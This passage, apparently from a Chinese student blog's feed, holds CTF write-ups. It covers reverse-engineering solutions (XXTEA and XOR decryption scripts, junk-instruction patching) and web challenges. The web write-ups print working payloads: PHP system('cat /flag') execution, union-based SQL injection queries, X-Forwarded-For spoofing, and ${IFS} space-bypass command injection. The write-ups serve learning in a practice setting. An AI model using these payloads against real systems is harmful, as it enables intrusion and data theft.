class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define delta 0x9e3779b9</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v[37] = &#123;0x76D42BE1, 0xD9DF03C4, 0x0BD0A181, 0xF10201C0, 0xE4592862, 0xCA7A6980, 0x042150A6, 0x2BE23AF3, 0x356E5E55, 0xC2337C76, 0xB7313BD7, 0x5B2E1195, 0xF59BE5C7, 0xD1FE3936, 0xBAD4593E, 0xC8776223, 0xA6ED7222, 0x811C4F11, 0x4FAD07DC, 0xD36AA578, 0x0230540B, 0xF89E6C42, 0x6D27DD7D, 0xECF5B7C3, 0xA9346EEC, 0xC81EF864, 0xAE305136, 0xB0DCD19A, 0x9149D1C7, 0xA593BD5F, 0x0458FCCA, 0x5A5BDBAF, 0x1C1C2221, 0x87DFA0FF, 0x4753CF52, 0x5D696B28, 0x422A7BB4&#125;;</span><br><span class="line">    </span><br><span class="line">        unsigned int key[5] = &#123;5,6,7,8,9&#125;;</span><br><span class="line">    unsigned int sum = 0;</span><br><span class="line">    unsigned int y,z,p,rounds,e;</span><br><span class="line">    int n = 37;</span><br><span class="line">    int i = 0;</span><br><span class="line">    rounds = 6 + 52/n;</span><br><span class="line">    y = v[0];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     do</span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; 2 &amp; 3;</span><br><span class="line">        for(p=n-1;p&gt;0;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p-1];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;5)^(y&lt;&lt;2))+((y&gt;&gt;3)^(z&lt;&lt;4))) ^ ((key[(p&amp;3)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n-1];</span><br><span class="line">        v[0] -= (((key[(p^e)&amp;3]^z)+(y ^ sum)) ^ (((y&lt;&lt;2)^(z&gt;&gt;5))+((z&lt;&lt;4)^(y&gt;&gt;3))));</span><br><span class="line">        y = v[0];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;while(--rounds);</span><br><span class="line"> </span><br><span class="line">    for(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+0),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+3));</span><br><span class="line">        //printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+3),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+0));</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Xr7WbpJDnom801xKJn0cqYqQnth.png"></p><p><code>QLNU&#123;^_^yoU_MuST_1iK3_Th3_t34_pR0m4x&#125;</code></p><h2 id="deepsleep"><a href="#deepsleep" class="headerlink" title="deepsleep"></a>deepsleep</h2><p>先拖进 die 中进行查看，没有加壳</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/NugAbQNpzoq6dmx4p4ccIIB7nUd.png"></p><p>那我们就直接拖进 ida 中查看 main 函数</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/R566bIN5uoQ8hkxtiTgck1rdn8C.png"></p><p>用户输入的为 24 字节的 Arglist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>+xmmword_402220 xmmword <span class="number">4040404040404040404040404040404</span>h</span><br><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>                                           ; DATA XREF: _main+<span class="number">157</span>↑r</span><br><span class="line">.rdata:<span class="number">00402230</span> <span class="number">55</span> <span class="number">48</span> <span class="number">4</span>A <span class="number">51</span> <span class="number">7F</span> <span class="number">73</span> <span class="number">34</span> <span class="number">5B</span> <span class="number">6</span>C <span class="number">45</span>+xmmword_402230 xmmword <span class="number">6</span>A656D7C5B6D456C5B34737F514A4855h</span><br></pre></td></tr></table></figure><p>前十六位和 16 个进行异或，后 8 位和 4 进行异或</p><p><code>C[whAaTy</code> 后 8 位预计输出的内容，将两端内容进行拼接，获取最后的 flag</p><p>利用脚本进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_re_challenge</span>():</span><br><span class="line">    <span class="comment"># 根据用户提供的数据段信息</span></span><br><span class="line">    <span class="comment"># xmmword_402220 是 16 个 0x04</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;\x04&#x27;</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xmmword_402230 的字节序列（从 .rdata 段提取）</span></span><br><span class="line">    xmm230_bytes = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;55484A517F73345B6C456D5B7C6D656A&quot;</span>)  <span class="comment"># 共16字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密后的后8字节数据（固定字符串 &quot;C[whAaTy&quot;）</span></span><br><span class="line">    encrypted_part2 = <span class="string">b&#x27;C[whAaTy&#x27;</span>  <span class="comment"># 原始字节：43 5B 77 68 41 61 54 79</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密前16字节：encrypted_part1 = xmm230_bytes，密钥为 xor_key (0x04*16)</span></span><br><span class="line">    decrypted_part1 = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(xmm230_bytes, xor_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后8字节：异或 0x04</span></span><br><span class="line">    decrypted_part2 = <span class="built_in">bytes</span>([c ^ <span class="number">0x04</span> <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_part2])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合得到原始输入（flag）</span></span><br><span class="line">    flag = decrypted_part1 + decrypted_part2</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密并输出结果</span></span><br><span class="line">flag = decrypt_re_challenge()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, flag.decode(<span class="string">&#x27;latin1&#x27;</span>))  <span class="comment"># 处理可能的非ASCII字符</span></span><br></pre></td></tr></table></figure><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Sr1XbEoRHovhPHxBM0Hc10CSnFg.png"></p><p>获得 flag</p><p><code> QLNU&#123;w0_hAi_xianG_slEeP&#125;</code></p><h2 id="HUA"><a href="#HUA" class="headerlink" title="HUA"></a>HUA</h2><p>先拖进 die 中</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/LLk9bx2aCoVOAYxsYeTc5Yj8nhg.png"></p><p>脱壳</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/MbKpbVEK9oUpSvxqmrqcmCsZnph.png"></p><p>脱壳完成后，拖进 ida 中</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/WV2IbJhCRoeXp5xZBgDcwDFPnse.png"></p><p>看到有一处标红，可能是花指令</p><p>把它 nop 掉</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/DjrJbR9gKo1OHuxAnSccsmGvnyd.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/HTuYb8nF6oqfyax2fQucC5bKnOh.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Dakmbxjo2o8ii6xC7Thcyv79nGg.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/BZWMbMNB2o2N5mxgXoGcOs3Bn9e.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/Xe96bDJ9moLLFYxGRGBcr7YFnic.png"></p><p>找到 地图</p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/CpVSbmH9woXH2UxRXV8c1Jrknsf.png"></p><p><img src="/images/week1-web-%E6%A0%A1%E8%B5%9Bwp.assets/RAarbU1qhooxL2x0J4icrSu6n5e.png"></p><p>得到 flag <code>QLNU&#123;ssaaasaassdddw&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week2-re-花指令</title>
      <link href="/2025/04/28/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2025/04/28/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Week2-re"><a href="#Week2-re" class="headerlink" title="Week2-re"></a>Week2-re</h1><h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p>就是脏代码</p><p>有不可执行花指令和可执行花指令</p><p>通常在 ida 中表现为爆红的部分，就像这次校赛中的 hua</p><p>利用反汇编算法的缺陷（线性扫描算法，递归进行算法）</p><h2 id="关于构造"><a href="#关于构造" class="headerlink" title="关于构造"></a>关于构造</h2><p>通过构造必然条件或者互补条件使反汇编出错</p><h3 id="简单-jmp"><a href="#简单-jmp" class="headerlink" title="简单 jmp"></a>简单 jmp</h3><p>只能骗过线性扫描算法，ida 能够正常识别</p><h3 id="多层跳转"><a href="#多层跳转" class="headerlink" title="多层跳转"></a>多层跳转</h3><p>多了几层跳转，和 jum 差不多</p><p>可以将花指令进行改写，让 ida 错误识别，达到目的</p><h3 id="jnx-和-jx-条件跳转"><a href="#jnx-和-jx-条件跳转" class="headerlink" title="jnx 和 jx 条件跳转"></a>jnx 和 jx 条件跳转</h3><p>利用 jz（当 <strong>零标志位（ZF）为 1</strong> 时跳转）和 jnz（当 <strong>零标志位（ZF）为 0</strong> 时跳转）的互补条件跳转指令代替 jmp</p><p>通常在去除的过程中可以看到很明显的标志（像 jz 和 jnz 这样）分析得到 jz 和 jnz 的长度，然后全部 nop 掉</p><h3 id="永真（永假）条件跳转"><a href="#永真（永假）条件跳转" class="headerlink" title="永真（永假）条件跳转"></a>永真（永假）条件跳转</h3><p>这种情况下程序一定会一直执行（就是没有被 ida 识别出来）</p><p>ida 反汇编优先反汇编 false 分支部分，调用某些函数返回确定值，来构造永真或永假条件</p><h3 id="call-ret-构造花指令"><a href="#call-ret-构造花指令" class="headerlink" title="call&amp;ret 构造花指令"></a>call&amp;ret 构造花指令</h3><p>利用 call 和 ret，在函数中修改返回地址，从而跳过 thunkcode 到正常流程，干扰 ida 正常识别。</p><p>call 指令：将下一条指令地址压入栈，再执行跳转。</p><p>ret 指令：将保存的地址取出，跳转执行。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="NSSRound-3-Team-jump-by-jump"><a href="#NSSRound-3-Team-jump-by-jump" class="headerlink" title="[NSSRound#3 Team]jump_by_jump"></a>[NSSRound#3 Team]jump_by_jump</h3><p>反汇编进入后，在 main 处按 U</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/CkpMb8wU4oFT6Yx061scS534nbP.png"></p><p>再将 E8 改为 90</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/AWtnbSwlmoo8f6xrIkNcFPzsnjf.png"></p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/XxmtbShK6o6AGuxRucFc8XhRnjc.png"></p><p>再向上找到 main 函数</p><p>按 P</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/GhuLbLuWXospTdxoAE7chgZ7nKc.png"></p><p>获得 flag <code>NSSCTF&#123;Jump_b9_jump!&#125;</code></p><h3 id="NSSRound-3-Team-jump-by-jump-revenge"><a href="#NSSRound-3-Team-jump-by-jump-revenge" class="headerlink" title="[NSSRound#3 Team]jump_by_jump_revenge"></a>[NSSRound#3 Team]jump_by_jump_revenge</h3><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/MqLSbGUzboUAovxbyxHcIOCnn3b.png"></p><p>进反汇编</p><p>选中 <code>jmp near ptr 0C086A4CCh</code>，使用快捷键 D 转换为硬指令：</p><p>选中 <code>db 0E9h</code>，右键 &gt; Patching &gt; Change byte，将开头的 E9 改为 90</p><p>选中 <code>db 90h</code>，按快捷键 C 将硬指令转换为代码</p><p>在 <code>main_0</code> 函数起始处按快捷键 P，重新生成函数</p><p>解除花指令</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/OGMrbqDeNoaTDZxGDWDcaQrOnS9.png"></p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/K9kBbjzb0oqWRHxUH2sckZnVnkp.png"></p><p>这个时候 main 函数已经被成功修复</p><p>进入 main_0 函数后</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/P5xVbSKg9oe2GkxINfPcZupznqf.png"></p><p>看到 <code>if ( !j_strcmp(Str1, &quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;) )</code></p><p>所以 str1 还原后就是 flag</p><p>这个利用脚本来完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cipher = &#x27;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&#x27;</span><br><span class="line">flag = &#x27;&#x27;**for** i **in** range(len(cipher) - 1, -1, -1):</span><br><span class="line">    **for** j **in** range(3):</span><br><span class="line">        **if** i &gt; (i * i + 123) % 21:</span><br><span class="line">            ascii_num = (ord(cipher[i]) - 32) + j * 96 - ord(cipher[(i * i + 123) % 21])</span><br><span class="line">            **if** 32 &lt; ascii_num &lt; 126:</span><br><span class="line">                flag += chr(ascii_num)</span><br><span class="line">        **else**:</span><br><span class="line">            ascii_num = (ord(cipher[i]) - 32) + j * 96 - ord(flag[len(cipher) - 1 - ((i * i + 123) % 21)])</span><br><span class="line">            **if** 32 &lt; ascii_num &lt; 126:</span><br><span class="line">                flag += chr(ascii_num)</span><br><span class="line">print(flag[::-1])</span><br></pre></td></tr></table></figure><p>运行后得到 flag <code>NSSCTF&#123;Jump_b9_jump!_r3V3n9e&#125;</code></p><h3 id="GFCTF-2021-wordy"><a href="#GFCTF-2021-wordy" class="headerlink" title="[GFCTF 2021]wordy"></a>[GFCTF 2021]wordy</h3><p>打开进入反汇编</p><p>我们需要先找到如何使花指令变为正常指令</p><p>我们先随意挑选一行，右键 Patch，修改前两个字节为 90，有其中的一行修改后 mov 变成 jmp，那么这个 EB 就是我们需要修改的地方，一个一个找太麻烦了，直接利用 idapython 脚本来处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x1144</span></span><br><span class="line">end = <span class="number">0x3100</span>**<span class="keyword">for</span>** i **<span class="keyword">in</span>** <span class="built_in">range</span>(start, end):</span><br><span class="line">    **<span class="keyword">if</span>** get_wide_byte(i) == <span class="number">0xEB</span> **<span class="keyword">and</span>** get_wide_byte(i + <span class="number">1</span>) == <span class="number">0xFF</span> **<span class="keyword">and</span>** get_wide_byte(i + <span class="number">2</span>) == <span class="number">0xC0</span>:</span><br><span class="line">        patch_byte(i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>这样就把所有的 EB 修改为 90 了</p><p>然后找到 main 函数，按 P 重新创建函数，按 F5 进入函数，但是我们发现运行出来不对，看到 <code>You didn&#39;t find Flag</code></p><p>我们重新进入反汇编，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [rbp-4], 0</span><br></pre></td></tr></table></figure><p>把这一段 nop 掉</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/GJXxbKzRXof4hQx319GcljoWn1e.png"></p><p>最后 main 函数是这样的两个部分</p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/XQtTb13qkohicfxN2rWcUtr6nXf.png"></p><p><img src="/images/week2-re-%E8%8A%B1%E6%8C%87%E4%BB%A4.assets/IL9UbWkWKo9ZC3xS2D6cTY2lnre.png"></p><p>当 <code>v4</code> 为真（非零）时，程序会输出 <code>G F C T F &#123; ... &#125;</code> 格式的 Flag，否则输出 <code>You didn&#39;t find Flag</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week4-web-例题</title>
      <link href="/2025/04/28/week4-web-%E4%BE%8B%E9%A2%98/"/>
      <url>/2025/04/28/week4-web-%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>根据提示已知flag位于根目录</p><p>我们先进去看一看</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674611-182.png" alt="img"></p><p>看到上面的这个页面，从run code可以看出，这是可以执行命令</p><p>我们需要构造payload,<code>system(&quot;ls /&quot;);</code>输出如下：</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-135.png" alt="img"></p><p>已知flag位于根目录，我们cat一下</p><p>我们尝试Flag是不行的，再尝试一下flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat /Flag&quot;);     system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-136.png" alt="img"></p><p><strong><code>NSSCTF&#123;54391812-9444-4e1c-85ef-e2f448d3aec3&#125;</code></strong></p><h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-137.png" alt="img"></p><p>又看到了</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-138.png" alt="img"></p><p>我们查询一下字段数，得到字段数为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-139.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-140.png" alt="img"></p><p>我们进行语句查询</p><p><code>?wllm=-1&#39; union select 1,2,3 --+</code>，找到了回显点</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-141.png" alt="img"></p><p>这样我们就得到了位置</p><p>第二行为name，第三行为password</p><p>继续查数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-142.png" alt="img"></p><p>继续查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-143.png" alt="img"></p><p>继续查两张表中的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;users&#x27;--+</span><br><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674608-144.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-145.png" alt="img"></p><p>在test_db表中看到了我们要的flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,flag from test_tb --+</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-146.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;4bd24c9e-1d76-4553-a818-8e715fa5c15e&#125;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><h3 id="方法一：利用burp"><a href="#方法一：利用burp" class="headerlink" title="方法一：利用burp"></a>方法一：利用burp</h3><p>打开后</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-147.png" alt="img"></p><p>提示我们使用WLLM</p><p>直接利用burp改服务器，现在是这样的</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-148.png" alt="img"></p><p>进行修改</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-149.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-150.png" alt="img"></p><p>看到这里，我们访问一下</p><p><a href="http://node4.anna.nssctf.cn:28123/a.php">http://node4.anna.nssctf.cn:28123/a.php</a></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-151.png" alt="img"></p><p>我们需要用当地地址进行读取</p><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>最后获得一个secretttt.php文件，进行访问，获得flag</p><h3 id="方法二：利用hacker"><a href="#方法二：利用hacker" class="headerlink" title="方法二：利用hacker"></a>方法二：利用hacker</h3><p>先改浏览器</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-152.png" alt="img"></p><p>发送请求后</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-153.png" alt="img"></p><p>最后再改本地地址</p><p>得到</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-154.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;135fca44-7741-4bc4-abe0-7666573ae7f9&#125;</span><br></pre></td></tr></table></figure><h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>这道题直接F12，最后就有flag</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-155.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;9f3c5d77-202b-432a-b268-741ba25925bb&#125;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-babyrce"><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h2><p>打开后</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-156.png" alt="img"></p><p>我们先分析一下这段php代码</p><p>最后检查是否存在名为<code>admin</code>的<code>cookie</code>且值等于1，若满足，包含上级目录中的<code>“nest.php”</code>文件；若不满足，<code>显示小饼干最好吃了</code></p><p>从提示中我们已经知道这是有关<code>空格绕过</code>，<code>RCE</code>，<code>cookie注入</code></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-157.png" alt="img"></p><p>设置cookie后 得到上图，接下来我们访问<code>rasalghul.php</code></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-158.png" alt="img"></p><p>显然这是过滤了空格</p><p>我们构造<code>url=ls$&#123;IFS&#125;/</code></p><p>访问，查看根目录</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-159.png" alt="img"></p><p>如上图，得到了flag的名，直接进行访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:27319/rasalghul.php``?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-160.png" alt="img"></p><p>得到flag<code>NSSCTF&#123;69fbcd69-1f5a-4a48-9e6d-b77c43617710&#125;</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="SWPU-2020-耗子尾汁"><a href="#SWPU-2020-耗子尾汁" class="headerlink" title="[SWPU 2020]耗子尾汁"></a>[SWPU 2020]耗子尾汁</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTczZWQ4Njk3MmNmOWRmYzMzMGExZDQyNzM1MDIzNzhfZkxxdmY4VEJ5d1N1dk1jeHNYUloxcUV2SmY5em50Z2FfVG9rZW46RnJ3bmJCMWdSb1hscDd4YWZVbmNKM0lLbm9jXzE3NDY2MTc1ODI6MTc0NjYyMTE4Ml9WNA" alt="img"></p><p>显然这是一个gif动图，我们先放进里面看一看有什么隐藏的东西</p><p>发现里面有隐藏的两个压缩文件，抽离出来，发现一个mp4和假的flag</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-162.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-163.png" alt="img"></p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-164.png" alt="img"></p><p>在mp4文件中我们看到了一闪而过的一个什么东西，我们调一下倍速，好不容易截到的图</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-165.png" alt="img"></p><p>直接利用赛博厨子</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-166.png" alt="img"></p><p>我们继续将MP4文件放进010，发现里面还有一个压缩文件</p><p>我们把它抽离出来，解压，发现需要密码，我们上面得到<code>sign_in</code></p><p>这个可能是解压的密码，输入进去确实是这样</p><p>里面是一下文本</p><p><img src="/../images/week4-web-%E4%BE%8B%E9%A2%98.assets/1746617674609-167.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 